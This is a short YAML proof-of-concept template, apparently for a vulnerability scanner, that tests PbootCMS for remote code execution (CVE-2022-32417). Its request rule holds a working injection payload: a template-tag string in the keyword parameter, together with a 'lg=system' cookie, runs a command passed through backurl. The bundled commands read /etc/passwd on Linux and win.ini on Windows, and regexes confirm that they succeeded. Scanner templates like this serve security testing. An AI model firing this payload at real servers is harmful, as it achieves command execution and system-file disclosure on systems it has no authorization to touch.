name: poc-yaml-pbootcms-rce-cve-2022-32417
binding: dad61f65-0b63-439c-9cef-ac08c8f31967
manual: true
detail:
    author: Aurora
    links:
        - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-32417
    vulnerability:
        id: CT-456587
        level: critical
transport: http
payloads:
    payloads:
        linux:
            cmd: |
                "cat%20/etc/passwd"
            re: |
                "root:[x*]:0:0:"
        windows:
            cmd: |
                "type%20C:\\Windows\\win.ini"
            re: |
                "for 16-bit app support"
rules:
    r0:
        request:
            cache: false
            method: GET
            path: /index.php?keyword=}{pboot:if(get_lg/*&*/()/*&*/(get_backurl/*&*/()))}data{/pboot:if}&backurl=;{{cmd}}
            headers:
                Cookie: lg=system
        expression: response.status == 200 && re.bmatches(response.body)
expression: r0()
